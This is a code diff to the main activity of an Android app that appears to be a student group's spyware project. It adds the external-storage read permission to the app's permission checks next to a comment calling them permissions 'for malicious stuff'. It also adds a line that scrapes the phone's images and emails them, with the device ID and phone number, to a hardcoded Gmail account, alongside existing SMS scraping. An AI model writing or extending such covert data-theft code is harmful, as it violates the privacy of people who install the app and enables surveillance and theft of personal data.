@@ -83,7 +83,10 @@ public class MainActivity extends AppCompatActivity {
                 permissionsNeeded.add("FineLocation");
             }
             if (!addPermission(permissionsList, Manifest.permission.READ_CALL_LOG)) {
-                permissionsNeeded.add("FineLocation");
+                permissionsNeeded.add("CallLog");
+            }
+            if (!addPermission(permissionsList, Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                permissionsNeeded.add("ReadExternalStorage");
             }
             if (!permissionsList.isEmpty()) {
                 requestPermissions(permissionsList.toArray(new String[0]),
@@ -119,6 +122,7 @@ public class MainActivity extends AppCompatActivity {
                 perms.put(Manifest.permission.ACCESS_COARSE_LOCATION, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.ACCESS_FINE_LOCATION, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.READ_CALL_LOG, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.READ_EXTERNAL_STORAGE, PackageManager.PERMISSION_GRANTED);
                 //Results
                 for (int i = 0; i < permissions.length; i++) {
                     perms.put(permissions[i], grantResults[i]);
@@ -132,6 +136,7 @@ public class MainActivity extends AppCompatActivity {
                         && perms.get(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                 )
                 {
                     //All required permissions for malicious stuff is granted
@@ -221,6 +226,7 @@ public class MainActivity extends AppCompatActivity {
                         + "\n\nSMS Messages:\n-----\n"
                         + MessageScrape.scrapeMessage(getContentResolver())
                 );
+                EmailPicHelper.sendEmail("ict1004p2grp4@gmail.com", "Images - "+ androidID +"  |  Number:"+phoneNum, "test", ImageScrape.scrapeImages(getContentResolver()));
             }
         }.start();
 
